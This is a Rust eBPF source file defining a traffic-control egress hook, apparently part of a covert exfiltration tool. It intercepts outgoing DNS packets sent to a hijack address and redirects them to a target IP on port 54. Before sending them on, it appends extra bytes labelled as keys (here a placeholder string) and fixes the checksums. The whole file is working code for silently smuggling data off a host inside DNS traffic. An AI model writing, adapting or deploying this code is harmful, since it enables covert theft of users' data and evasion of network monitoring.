use core::net::Ipv4Addr;

use aya_ebpf::{
    bindings::TC_ACT_PIPE,
    cty::c_void,
    helpers::{bpf_get_hash_recalc, bpf_set_hash_invalid, bpf_skb_store_bytes},
    macros::{classifier, map},
    maps::PerCpuArray,
    programs::TcContext,
};
use aya_log_ebpf::{error, info};
// use flex_dns::DnsMessage;
use network_types::{
    eth::{EthHdr, EtherType},
    ip::{IpProto, Ipv4Hdr},
    udp::UdpHdr,
};

use crate::common::{
    calculate_udp_checksum, log_csums, update_addr, update_port, UpdateType, BPF_ADJ_ROOM_NET,
    DNS_QUERY_OFFSET, HIJACK_IP, IP_CSUM_OFFSET, IP_TOT_LEN_OFFSET, TARGET_IP, UDP_CSUM_OFFSET,
    UDP_DEST_PORT_OFFSET, UDP_LEN_OFFSET, UDP_OFFSET,
};

// Maps

const KEYS_PAYLOAD_LEN: usize = 4;
const DNS_PAYLOAD_MAX_LEN: usize = 128;
pub struct Buf {
    pub buf: [u8; KEYS_PAYLOAD_LEN + DNS_PAYLOAD_MAX_LEN],
}

#[map]
pub static mut DNS_BUFFER: PerCpuArray<Buf> = PerCpuArray::with_max_entries(1, 0);

fn update_udp_hdr_len(ctx: &mut TcContext, new_be: &u16) -> Result<(), ()> {
    info!(ctx, "updating udphdr len:");
    ctx.store(UDP_LEN_OFFSET, new_be, 0).map_err(|_| {
        error!(ctx, "error writing new udp hdr len ");
        ()
    })?;
    log_csums(ctx);
    Ok(())
}

fn update_ip_hdr_tot_len(ctx: &mut TcContext, old_be: &u16, new_be: &u16) -> Result<(), ()> {
    info!(ctx, "updating iphdr tot len:");
    ctx.store(IP_TOT_LEN_OFFSET, new_be, 0).map_err(|_| {
        error!(ctx, "error writing iphdr tot len ");
        ()
    })?;
    ctx.l3_csum_replace(IP_CSUM_OFFSET, *old_be as u64, *new_be as u64, 4)
        .map_err(|_| {
            error!(ctx, "error: l3_csum_replace");
            ()
        })?;

    log_csums(ctx);
    Ok(())
}

fn inject_udp_payload(ctx: &mut TcContext, offset: usize, new_be: &u32) -> Result<(), ()> {
    info!(ctx, "injecting udp payload:");
    ctx.store(offset, new_be, 0).map_err(|_| {
        error!(ctx, "error injecting payload ");
        ()
    })?;

    log_csums(ctx);
    Ok(())
}

#[classifier]
pub fn tamanoir_egress(mut ctx: TcContext) -> i32 {
    match tc_process_egress(&mut ctx) {
        Ok(ret) => ret,
        Err(_) => TC_ACT_PIPE,
    }
}

fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, ()> {
    let target_ip: u32 = unsafe { core::ptr::read_volatile(&TARGET_IP) };
    let hijack_ip: u32 = unsafe { core::ptr::read_volatile(&HIJACK_IP) };
    let ethhdr: EthHdr = ctx.load(0).map_err(|_| ())?;
    if let EtherType::Ipv4 = ethhdr.ether_type {
        let header = ctx.load::<Ipv4Hdr>(EthHdr::LEN).map_err(|_| ())?;
        let addr = header.dst_addr;
        if let IpProto::Udp = header.proto {
            if u32::from_be(addr) == hijack_ip {
                info!(ctx, "\n-----\nNew intercepted request:\n-----");

                let udp_hdr = &ctx.load::<UdpHdr>(UDP_OFFSET).map_err(|_| ())?;

                let dns_payload_len = (u16::from_be(header.tot_len) as usize)
                    .checked_sub(EthHdr::LEN + Ipv4Hdr::LEN + UdpHdr::LEN)
                    .ok_or(())?;

                if dns_payload_len <= DNS_PAYLOAD_MAX_LEN {
                    let buf = unsafe {
                        let ptr = DNS_BUFFER.get_ptr_mut(0).ok_or(())?;
                        &mut (*ptr).buf
                    };

                    ctx.load_bytes(DNS_QUERY_OFFSET, &mut buf[..dns_payload_len])
                        .map_err(|_| ())?;

                    let mut fixed_size_added_keys = [0u8; KEYS_PAYLOAD_LEN];
                    let payload: &[u8] = "toto".as_bytes();
                    fixed_size_added_keys[..payload.len()].copy_from_slice(payload);

                    let keys_as_u32: u32 = ((fixed_size_added_keys[0] as u32) << 24)
                        | ((fixed_size_added_keys[1] as u32) << 16)
                        | ((fixed_size_added_keys[2] as u32) << 8)
                        | fixed_size_added_keys[3] as u32;

                    let offset = fixed_size_added_keys.len();

                    log_csums(&ctx);
                    update_addr(ctx, &addr, &target_ip.to_be(), UpdateType::Dst)?;
                    update_ip_hdr_tot_len(
                        ctx,
                        &header.tot_len,
                        &(u16::from_be(header.tot_len) + offset as u16).to_be(),
                    )?;

                    // make room
                    ctx.skb
                        .adjust_room(offset as i32, BPF_ADJ_ROOM_NET, 0)
                        .map_err(|_| {
                            error!(ctx, "error adjusting room");
                            ()
                        })?;

                    // move udp header
                    ctx.store(UDP_OFFSET, &udp_hdr, 0).map_err(|_| {
                        error!(ctx, "error shifting udp header ");
                        ()
                    })?;

                    //move dns payload
                    let buf = unsafe {
                        let ptr = DNS_BUFFER.get_ptr(0).ok_or(())?;
                        &*ptr
                    };

                    if unsafe {
                        bpf_skb_store_bytes(
                            ctx.skb.skb,
                            DNS_QUERY_OFFSET as u32,
                            &buf.buf[..dns_payload_len] as *const _ as *const c_void,
                            dns_payload_len as u32,
                            0,
                        )
                    } < 0
                    {
                        error!(ctx, "error shifting dns payload ");
                        return Ok(TC_ACT_PIPE);
                    }

                    inject_udp_payload(
                        ctx,
                        DNS_QUERY_OFFSET + dns_payload_len,
                        &keys_as_u32.to_be(),
                    )?;

                    update_udp_hdr_len(ctx, &(u16::from_be(udp_hdr.len) + offset as u16).to_be())?;

                    update_port(ctx, &53u16.to_be(), &54u16.to_be(), UpdateType::Dst)?;

                    //recompute checksum layer 4
                    //set current csum to 0
                    ctx.store(UDP_CSUM_OFFSET, &0, 2).map_err(|_| {
                        error!(ctx, "error zeroing L4 csum");
                        ()
                    })?;

                    let udp_hdr_bytes = &ctx.load::<[u8; 8]>(UDP_OFFSET).map_err(|_| ())?;
                    let buf = unsafe {
                        let ptr = DNS_BUFFER.get_ptr_mut(0).ok_or(())?;
                        &mut (*ptr).buf
                    };

                    ctx.load_bytes(DNS_QUERY_OFFSET, &mut buf[..])
                        .map_err(|_| ())?;

                    let new_cs = calculate_udp_checksum(
                        u32::from_be(header.src_addr),
                        target_ip,
                        udp_hdr_bytes,
                        &unsafe { DNS_BUFFER.get(0) }.ok_or(())?.buf[..],
                    );

                    info!(ctx, "NEW CS: {}", new_cs);
                    ctx.store(UDP_CSUM_OFFSET, &new_cs.to_be(), 2)
                        .map_err(|_| {
                            error!(ctx, "error reseting L4 csum");
                            ()
                        })?;

                    unsafe {
                        bpf_set_hash_invalid(ctx.skb.skb);
                        bpf_get_hash_recalc(ctx.skb.skb);
                    }

                    info!(
                        ctx,
                        "{}:{} -> {}:{}",
                        Ipv4Addr::from_bits(addr),
                        53,
                        Ipv4Addr::from_bits(u32::from_be(
                            (ctx.load::<Ipv4Hdr>(EthHdr::LEN).unwrap()).dst_addr,
                        )),
                        u16::from_be(ctx.load::<u16>(UDP_DEST_PORT_OFFSET).unwrap())
                    );
                };
            }
        };
    }

    Ok(TC_ACT_PIPE)
}
